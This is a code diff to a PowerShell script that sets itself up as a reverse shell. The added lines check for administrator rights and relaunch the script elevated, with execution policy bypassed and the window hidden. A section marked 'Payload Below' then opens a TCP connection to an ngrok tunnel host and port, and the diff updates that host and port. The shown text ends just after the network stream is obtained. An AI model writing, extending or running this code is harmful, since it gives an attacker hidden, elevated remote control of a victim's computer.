@@ -1,9 +1,25 @@
+function Test-IsAdmin {
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+}
+
+function Self-Elevate {
+    if (-not (Test-IsAdmin)) {
+        $scriptPath = $MyInvocation.MyCommand.Path
+        Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+        exit
+    }
+}
+
+Self-Elevate
+
+# === Payload Below ===
 try {
     "Starting script at $(Get-Date)" | Out-File "$env:TEMP\rev_log.txt" -Append
 
-    # TcpClient reverse shell logic here...
-    $client = "0.tcp.in.ngrok.io"
-    $port = 15906
+    $client = "0.tcp.ngrok.io"
+    $port = 10976
 
     $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
     $stream = $tcp.GetStream()
